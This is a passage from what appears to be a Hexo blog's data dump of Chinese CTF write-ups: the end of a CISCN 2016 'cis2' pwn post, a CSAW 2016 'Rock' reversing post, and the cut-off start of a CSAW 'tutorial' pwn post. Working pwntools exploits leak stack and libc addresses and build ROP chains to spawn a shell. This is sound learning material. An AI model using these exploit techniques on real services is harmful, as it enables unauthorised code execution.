shell</span></div><div class=\"line\">\tp.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>\n","excerpt":"<p>这道题最终还是本地成功远程失败，这次的原因还是too young……还是再记录一下吧。</p>\n<p>可能是上一题折腾太久了，拿到这一题直接file看一眼strings一下就直接拖进IDA静态分析了，就是忘了例行看一下checksec和vmmap，也可能是因为这么长一段时间接触的就没有不开NX的吧，突然来个都没开NX的完全就不记得还有这茬了，看来还是修为不够。</p>","more":"<p>实力懵逼：<br><img src=\"/images/ciscnctf_2016_cis2_writeup0.png\" alt=\"ciscnctf_2016_cis2_writeup0.png\"></p>\n<p>这道题还是挺简单的，就是循环读到token中，符合％d且index在1-46的话就可以写入这个stack中，不符合％d的话就按照操作数处理：</p>\n<p><img src=\"/images/ciscnctf_2016_cis2_writeup1.png\" alt=\"ciscnctf_2016_cis2_writeup1.png\"></p>\n<p>支持的操作数有’+’,’-‘,’m’,’w’,’p’,’n’,’.’,’q’,作用很显然：<br><img src=\"/images/ciscnctf_2016_cis2_writeup2.png\" alt=\"ciscnctf_2016_cis2_writeup2.png\"></p>\n<p>不过有个问题就是IDA把这里的变量名处理为stack，我觉得还是处理为values比较好，不然容易引起歧义，因为stack是main中出现过的一个变量名，用于定义values和index,大概是:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">values=&amp;(<span class=\"built_in\">stack</span>[<span class=\"number\">1</span>]);</div><div class=\"line\">index=&amp;(<span class=\"built_in\">stack</span>[<span class=\"number\">0</span>]);</div></pre></td></tr></table></figure>\n<p>所以一开始的主要思路就是先操作index指向栈中存在的__libc_start_main+245的地址，把它泄漏出来，然后再根据末12bit查版本算偏移，在操作index重写返回地址就可以了。</p>\n<p>麻烦的就是对index的操作只能控制它任意向低地址移动，向高地址移动的话就会使用values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>重写移向的地址。所以想要泄漏<strong>libc_start_main+245的地址不能简单的向高处移动index，由于程序计算values[index]是通过values基址加index偏移得出来的，所以我们可以增大values基址使计算后的结果正好指向</strong>libc_start_main+245这个地址就可以泄漏它。</p>\n<p>于是以下图中的地址为例（0x7fffffffe220存储index指针，0x0x7fffffffe228存储values值），我们需要先向低地址移动泄漏栈地址，然后回来根据泄漏的栈地址计算修改后的values值，写入values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>中，再使用’w’写入0x0x7fffffffe228。这个时候再使用’p’就可以泄漏__libc_start_main+245地址。<br><img src=\"/images/ciscnctf_2016_cis2_writeup3.png\" alt=\"ciscnctf_2016_cis2_writeup3.png\"></p>\n<p>接下来就需要类似的方式先写入values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>再覆盖到目标地址中的方式（当然这个时候values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>的位置也改变了），构造ROP链触发system(‘/bin/sh’)了。</p>\n<p>但是远程因为查不到glibc版本所以又跪了。看来查版本这招本来就不该算做正确姿势……</p>\n<p>所以正确姿势应该是在可读可写的区域直接写入shellcode再控制EIP进去……</p>\n<p>还是附上可怜的expolit：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">p=process(<span class=\"string\">'./cis2'</span>)</div><div class=\"line\"><span class=\"comment\"># p=remote('106.75.37.31',23333)</span></div><div class=\"line\"></div><div class=\"line\">pop_rdi_ret=int(<span class=\"string\">'0x400ad3'</span>,<span class=\"number\">16</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">w</span><span class=\"params\">(high,value,low)</span>:</span></div><div class=\"line\">\t<span class=\"comment\"># first move down</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(high):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write into stack[2]</span></div><div class=\"line\">\tp.sendline(str(value))</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'write value: '</span>+hex(c_uint32(value).value)</div><div class=\"line\">\t<span class=\"comment\"># copy into stack[1]</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'m'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(low):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Fight!\\n\\n'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># begin</span></div><div class=\"line\">\t<span class=\"comment\"># first get stack addr</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">33</span>):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'p'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Value: '</span>)</div><div class=\"line\">\taddr=p.recvline().strip()</div><div class=\"line\">\taddr=int(addr,<span class=\"number\">10</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'leak stack addr: '</span>+hex(c_uint32(addr).value)</div><div class=\"line\">\tstack_addr=addr<span class=\"number\">-420</span></div><div class=\"line\">\tdest_addr=stack_addr+<span class=\"number\">65</span>*<span class=\"number\">4</span></div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'modify base addr to: '</span>+hex(c_uint32(dest_addr).value)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">9</span>):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\">\t<span class=\"comment\"># write into stack[2]</span></div><div class=\"line\">\tp.sendline(str(dest_addr))</div><div class=\"line\">\t<span class=\"comment\"># copy into stack[1]</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'+'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">17</span>):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># now values[index] should point to __libc_start_main's address prefix</span></div><div class=\"line\">\t<span class=\"comment\"># first leak libc_prefix</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'p'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Value: '</span>)</div><div class=\"line\">\tlibc_prefix=p.recvline().strip()</div><div class=\"line\">\tlibc_prefix=int(libc_prefix,<span class=\"number\">10</span>)</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'leak libc prefix: '</span>+hex(c_uint32(libc_prefix).value)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># now leak libc other address</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'p'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Value: '</span>)</div><div class=\"line\">\tlibc_addr=p.recvline().strip()</div><div class=\"line\">\tlibc_addr=int(libc_addr,<span class=\"number\">10</span>)</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'leak libc addr: '</span>+hex(c_uint32(libc_addr).value)</div><div class=\"line\"></div><div class=\"line\">\tlibc_addr=libc_addr<span class=\"number\">-245</span></div><div class=\"line\">\t<span class=\"comment\"># I used libc-database to search the version of glibc on the remote once but I get nothing.</span></div><div class=\"line\">\t<span class=\"comment\"># So I failed to get shell from remote.</span></div><div class=\"line\">\tsys_addr=libc_addr<span class=\"number\">-0x21a50</span>+<span class=\"number\">0x414f0</span></div><div class=\"line\">\tbinsh_addr=libc_addr<span class=\"number\">-0x21a50</span>+<span class=\"number\">0x161160</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">#################################################################################</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write pop gadget addr into stack </span></div><div class=\"line\">\tw(<span class=\"number\">17</span>,pop_rdi_ret,<span class=\"number\">19</span>)</div><div class=\"line\">\tw(<span class=\"number\">17</span>,<span class=\"number\">0</span>,<span class=\"number\">18</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write /bin/sh addr to target addr</span></div><div class=\"line\">\tw(<span class=\"number\">16</span>,binsh_addr,<span class=\"number\">17</span>)</div><div class=\"line\">\tw(<span class=\"number\">15</span>,libc_prefix,<span class=\"number\">16</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write sys addr to target addr</span></div><div class=\"line\">\tw(<span class=\"number\">14</span>,sys_addr,<span class=\"number\">15</span>)</div><div class=\"line\">\tw(<span class=\"number\">13</span>,libc_prefix,<span class=\"number\">14</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># gdb.attach(p,'b *0x400987')</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'q'</span>)</div><div class=\"line\">\t<span class=\"comment\"># get shell</span></div><div class=\"line\">\tp.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>"},{"title":"CSAW 2016 Rock writeup","date":"2016-09-19T07:48:00.000Z","_content":"\n100分的Reverse\n\n由于是C＋＋的程序，所以一开始看起来很杂乱，经过分析之后程序的主要逻辑是这样：\n\n<!--more-->\n\n![csaw_2016_rock_writeup0.png][1]\n\n一开始用到一个结构体，大概长这样：\n\n![csaw_2016_rock_writeup1.png][2]\n\n分析之后的逻辑就比较简单了，主要就是对输入的字符串进行逐个异或以及加法运算。写个脚本反过来算一遍就好了，但是一开始没注意到图中加注释的两行函数的操作不是加在原始字符串上的，而是新开了内存在操作后面直接丢弃了，所以第一次写的脚本跑出来根本不对... 然而一时又没找到哪里有问题，这时看它最后的输出可以用于直接爆破，就干脆写个爆破脚本，所以最后还是爆破出来的...\n\n正常版本脚本：\n\n```python\nfstr='FLAG23456912365453475897834567'\n\ndef add_xor_str(s,added,xored):\n\tret=''\n\tfor x in s:\n\t\tx=ord(x)+added\n\t\tx=x^xored\n\t\tret+=chr(x)\n\treturn ret\n\ndef decrypt(fstr):\n\tfstr=add_xor_str(fstr,-9,0x10)\n\tfstr=add_xor_str(fstr,-20,0x50)\n\t# these two lines are useless because operations about these two lines\n\t# in origin program does not has effect on origin input string\n\t# fstr=add_xor_str(fstr,-35,0x20)\n\t# fstr=add_xor_str(fstr,0,0x50)\n\tprint fstr\n\ndecrypt(fstr)\n```\n\n爆破版本：\n\n```python\nfrom pwn import *\n\ndef testn(ps,n):\n\tfor x in range(33,127):\n\t\tnows=ps[:n]+chr(x)+ps[n+1:]\n\t\tp=process('rock')\n\t\tp.sendline(nows)\n\t\trecv=p.recvall()\n\t\t# get number\n\t\tfinal=recv[-2] if n<10 else recv[-3:-1]\n\t\tp.close()\n\t\tprint 'recv: '+recv[-10:]\n\t\ttry:\n\t\t\tif int(final)==n:\n\t\t\t\tcontinue\n\t\t\telse:\n\t\t\t\treturn nows\n\t\texcept Exception as e:\n\t\t\treturn nows\n\t\t\n\ns='ABCDEFGHIJKLMNOPQRSTUVWXYZABCD'\nfor i in range(0,30):\n\tprint '------------------------------------'+str(i)+'-------------------------------------'\n\ts=testn(s,i)\nprint s\n```\n\n\n\n\n\n[1]: /images/csaw_2016_rock_writeup0.png\n[2]: /images/csaw_2016_rock_writeup1.png\n\n","source":"_posts/csaw_2016_rock_writeup.md","raw":"title: CSAW 2016 Rock writeup\n\ndate: 2016/09/19 15:48:00\n\n---\n\n100分的Reverse\n\n由于是C＋＋的程序，所以一开始看起来很杂乱，经过分析之后程序的主要逻辑是这样：\n\n<!--more-->\n\n![csaw_2016_rock_writeup0.png][1]\n\n一开始用到一个结构体，大概长这样：\n\n![csaw_2016_rock_writeup1.png][2]\n\n分析之后的逻辑就比较简单了，主要就是对输入的字符串进行逐个异或以及加法运算。写个脚本反过来算一遍就好了，但是一开始没注意到图中加注释的两行函数的操作不是加在原始字符串上的，而是新开了内存在操作后面直接丢弃了，所以第一次写的脚本跑出来根本不对... 然而一时又没找到哪里有问题，这时看它最后的输出可以用于直接爆破，就干脆写个爆破脚本，所以最后还是爆破出来的...\n\n正常版本脚本：\n\n```python\nfstr='FLAG23456912365453475897834567'\n\ndef add_xor_str(s,added,xored):\n\tret=''\n\tfor x in s:\n\t\tx=ord(x)+added\n\t\tx=x^xored\n\t\tret+=chr(x)\n\treturn ret\n\ndef decrypt(fstr):\n\tfstr=add_xor_str(fstr,-9,0x10)\n\tfstr=add_xor_str(fstr,-20,0x50)\n\t# these two lines are useless because operations about these two lines\n\t# in origin program does not has effect on origin input string\n\t# fstr=add_xor_str(fstr,-35,0x20)\n\t# fstr=add_xor_str(fstr,0,0x50)\n\tprint fstr\n\ndecrypt(fstr)\n```\n\n爆破版本：\n\n```python\nfrom pwn import *\n\ndef testn(ps,n):\n\tfor x in range(33,127):\n\t\tnows=ps[:n]+chr(x)+ps[n+1:]\n\t\tp=process('rock')\n\t\tp.sendline(nows)\n\t\trecv=p.recvall()\n\t\t# get number\n\t\tfinal=recv[-2] if n<10 else recv[-3:-1]\n\t\tp.close()\n\t\tprint 'recv: '+recv[-10:]\n\t\ttry:\n\t\t\tif int(final)==n:\n\t\t\t\tcontinue\n\t\t\telse:\n\t\t\t\treturn nows\n\t\texcept Exception as e:\n\t\t\treturn nows\n\t\t\n\ns='ABCDEFGHIJKLMNOPQRSTUVWXYZABCD'\nfor i in range(0,30):\n\tprint '------------------------------------'+str(i)+'-------------------------------------'\n\ts=testn(s,i)\nprint s\n```\n\n\n\n\n\n[1]: /images/csaw_2016_rock_writeup0.png\n[2]: /images/csaw_2016_rock_writeup1.png\n\n","slug":"csaw_2016_rock_writeup","published":1,"updated":"2016-11-01T16:29:30.488Z","_id":"ciuzpjgy80000bs60pj71rbu6","comments":1,"layout":"post","photos":[],"link":"","content":"<p>100分的Reverse</p>\n<p>由于是C＋＋的程序，所以一开始看起来很杂乱，经过分析之后程序的主要逻辑是这样：</p>\n<a id=\"more\"></a>\n<p><img src=\"/images/csaw_2016_rock_writeup0.png\" alt=\"csaw_2016_rock_writeup0.png\"></p>\n<p>一开始用到一个结构体，大概长这样：</p>\n<p><img src=\"/images/csaw_2016_rock_writeup1.png\" alt=\"csaw_2016_rock_writeup1.png\"></p>\n<p>分析之后的逻辑就比较简单了，主要就是对输入的字符串进行逐个异或以及加法运算。写个脚本反过来算一遍就好了，但是一开始没注意到图中加注释的两行函数的操作不是加在原始字符串上的，而是新开了内存在操作后面直接丢弃了，所以第一次写的脚本跑出来根本不对… 然而一时又没找到哪里有问题，这时看它最后的输出可以用于直接爆破，就干脆写个爆破脚本，所以最后还是爆破出来的…</p>\n<p>正常版本脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">fstr=<span class=\"string\">'FLAG23456912365453475897834567'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add_xor_str</span><span class=\"params\">(s,added,xored)</span>:</span></div><div class=\"line\">\tret=<span class=\"string\">''</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> s:</div><div class=\"line\">\t\tx=ord(x)+added</div><div class=\"line\">\t\tx=x^xored</div><div class=\"line\">\t\tret+=chr(x)</div><div class=\"line\">\t<span class=\"keyword\">return</span> ret</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span><span class=\"params\">(fstr)</span>:</span></div><div class=\"line\">\tfstr=add_xor_str(fstr,<span class=\"number\">-9</span>,<span class=\"number\">0x10</span>)</div><div class=\"line\">\tfstr=add_xor_str(fstr,<span class=\"number\">-20</span>,<span class=\"number\">0x50</span>)</div><div class=\"line\">\t<span class=\"comment\"># these two lines are useless because operations about these two lines</span></div><div class=\"line\">\t<span class=\"comment\"># in origin program does not has effect on origin input string</span></div><div class=\"line\">\t<span class=\"comment\"># fstr=add_xor_str(fstr,-35,0x20)</span></div><div class=\"line\">\t<span class=\"comment\"># fstr=add_xor_str(fstr,0,0x50)</span></div><div class=\"line\">\t<span class=\"keyword\">print</span> fstr</div><div class=\"line\"></div><div class=\"line\">decrypt(fstr)</div></pre></td></tr></table></figure>\n<p>爆破版本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">testn</span><span class=\"params\">(ps,n)</span>:</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">33</span>,<span class=\"number\">127</span>):</div><div class=\"line\">\t\tnows=ps[:n]+chr(x)+ps[n+<span class=\"number\">1</span>:]</div><div class=\"line\">\t\tp=process(<span class=\"string\">'rock'</span>)</div><div class=\"line\">\t\tp.sendline(nows)</div><div class=\"line\">\t\trecv=p.recvall()</div><div class=\"line\">\t\t<span class=\"comment\"># get number</span></div><div class=\"line\">\t\tfinal=recv[<span class=\"number\">-2</span>] <span class=\"keyword\">if</span> n&lt;<span class=\"number\">10</span> <span class=\"keyword\">else</span> recv[<span class=\"number\">-3</span>:<span class=\"number\">-1</span>]</div><div class=\"line\">\t\tp.close()</div><div class=\"line\">\t\t<span class=\"keyword\">print</span> <span class=\"string\">'recv: '</span>+recv[<span class=\"number\">-10</span>:]</div><div class=\"line\">\t\t<span class=\"keyword\">try</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> int(final)==n:</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span></div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> nows</div><div class=\"line\">\t\t<span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> nows</div><div class=\"line\">\t\t</div><div class=\"line\"></div><div class=\"line\">s=<span class=\"string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZABCD'</span></div><div class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">30</span>):</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'------------------------------------'</span>+str(i)+<span class=\"string\">'-------------------------------------'</span></div><div class=\"line\">\ts=testn(s,i)</div><div class=\"line\"><span class=\"keyword\">print</span> s</div></pre></td></tr></table></figure>\n","excerpt":"<p>100分的Reverse</p>\n<p>由于是C＋＋的程序，所以一开始看起来很杂乱，经过分析之后程序的主要逻辑是这样：</p>","more":"<p><img src=\"/images/csaw_2016_rock_writeup0.png\" alt=\"csaw_2016_rock_writeup0.png\"></p>\n<p>一开始用到一个结构体，大概长这样：</p>\n<p><img src=\"/images/csaw_2016_rock_writeup1.png\" alt=\"csaw_2016_rock_writeup1.png\"></p>\n<p>分析之后的逻辑就比较简单了，主要就是对输入的字符串进行逐个异或以及加法运算。写个脚本反过来算一遍就好了，但是一开始没注意到图中加注释的两行函数的操作不是加在原始字符串上的，而是新开了内存在操作后面直接丢弃了，所以第一次写的脚本跑出来根本不对… 然而一时又没找到哪里有问题，这时看它最后的输出可以用于直接爆破，就干脆写个爆破脚本，所以最后还是爆破出来的…</p>\n<p>正常版本脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">fstr=<span class=\"string\">'FLAG23456912365453475897834567'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add_xor_str</span><span class=\"params\">(s,added,xored)</span>:</span></div><div class=\"line\">\tret=<span class=\"string\">''</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> s:</div><div class=\"line\">\t\tx=ord(x)+added</div><div class=\"line\">\t\tx=x^xored</div><div class=\"line\">\t\tret+=chr(x)</div><div class=\"line\">\t<span class=\"keyword\">return</span> ret</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span><span class=\"params\">(fstr)</span>:</span></div><div class=\"line\">\tfstr=add_xor_str(fstr,<span class=\"number\">-9</span>,<span class=\"number\">0x10</span>)</div><div class=\"line\">\tfstr=add_xor_str(fstr,<span class=\"number\">-20</span>,<span class=\"number\">0x50</span>)</div><div class=\"line\">\t<span class=\"comment\"># these two lines are useless because operations about these two lines</span></div><div class=\"line\">\t<span class=\"comment\"># in origin program does not has effect on origin input string</span></div><div class=\"line\">\t<span class=\"comment\"># fstr=add_xor_str(fstr,-35,0x20)</span></div><div class=\"line\">\t<span class=\"comment\"># fstr=add_xor_str(fstr,0,0x50)</span></div><div class=\"line\">\t<span class=\"keyword\">print</span> fstr</div><div class=\"line\"></div><div class=\"line\">decrypt(fstr)</div></pre></td></tr></table></figure>\n<p>爆破版本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">testn</span><span class=\"params\">(ps,n)</span>:</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">33</span>,<span class=\"number\">127</span>):</div><div class=\"line\">\t\tnows=ps[:n]+chr(x)+ps[n+<span class=\"number\">1</span>:]</div><div class=\"line\">\t\tp=process(<span class=\"string\">'rock'</span>)</div><div class=\"line\">\t\tp.sendline(nows)</div><div class=\"line\">\t\trecv=p.recvall()</div><div class=\"line\">\t\t<span class=\"comment\"># get number</span></div><div class=\"line\">\t\tfinal=recv[<span class=\"number\">-2</span>] <span class=\"keyword\">if</span> n&lt;<span class=\"number\">10</span> <span class=\"keyword\">else</span> recv[<span class=\"number\">-3</span>:<span class=\"number\">-1</span>]</div><div class=\"line\">\t\tp.close()</div><div class=\"line\">\t\t<span class=\"keyword\">print</span> <span class=\"string\">'recv: '</span>+recv[<span class=\"number\">-10</span>:]</div><div class=\"line\">\t\t<span class=\"keyword\">try</span>:</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> int(final)==n:</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">continue</span></div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span>:</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> nows</div><div class=\"line\">\t\t<span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> nows</div><div class=\"line\">\t\t</div><div class=\"line\"></div><div class=\"line\">s=<span class=\"string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZABCD'</span></div><div class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">30</span>):</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'------------------------------------'</span>+str(i)+<span class=\"string\">'-------------------------------------'</span></div><div class=\"line\">\ts=testn(s,i)</div><div class=\"line\"><span class=\"keyword\">print</span> s</div></pre></td></tr></table></figure>"},{"title":"CSAW 2016 tutorial writeup","date":"2016-09-19T08:48:00.000Z","_content":"\n200分的Pwn\n\n同样也是拿到手简单跑一下就扔进IDA里静态看。\n程序主体不多，一个服务端程序，用第一个参数作为监听端口，然后就是常规的bind，listen，fork来处理。nc连上去会有三个选项，一个减法运算过的puts函数在libc中的地址，第二个接受输入然后造成栈溢出，第三个退出。\n\n<!--more-->\n\n由于已经给了libc就很好办了，拿了puts地址算system、\"/bin/sh\"地址，除此之外还要找一个dup2地址来把标准输出输入重定向到socket来，否则只是在服务端调用了system（这个一开始也没注意到，觉得没问题可是不见shell回来又折腾了一下才突然发现没重定向），然后来一波ROP就可以。\n\n完整exploit：\n\n```python\nfrom pwn import *\n\n#p=remote('127.0.0.1',9990)\np=remote('pwn.chal.csaw.io',8002)\n\npoprdi=0x00000000004012e3 # pop rdi ; ret\npoprsi=0x00000000004012e1 # pop rsi ; pop r15 ; ret\npick64 = lambda x: u64(x.ljust(8, 